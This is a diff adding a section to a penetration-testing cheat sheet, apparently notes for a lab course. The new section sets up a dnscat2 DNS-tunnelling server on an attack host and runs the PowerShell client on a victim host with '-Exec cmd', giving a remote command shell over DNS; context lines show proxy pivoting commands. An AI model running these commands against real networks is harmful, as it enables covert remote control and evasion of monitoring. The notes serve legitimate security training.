@@ -1211,7 +1211,27 @@ attack machine -> proxychains curl --noproxy '*' http://172.16.5.135:80
 
 Pivot machine -> python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 
-``` 
+```
+##### DNS Tunneling with Dnscat2
+```
+>> from attack host (server side):-
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+>> Then colning the clinde script to attack host too.
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+>> copy the dnscat2-powershell.py script to the pivot host or the victom host
+
+>> from pivot/victm host (client side):-
+- Import-Module .\dnscat2.ps1
+- Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+		dnscat2> ?
+		dnscat2> window -i 1
+```
 ## Attacking Common Services
 ##### Attacking FTP
 ```
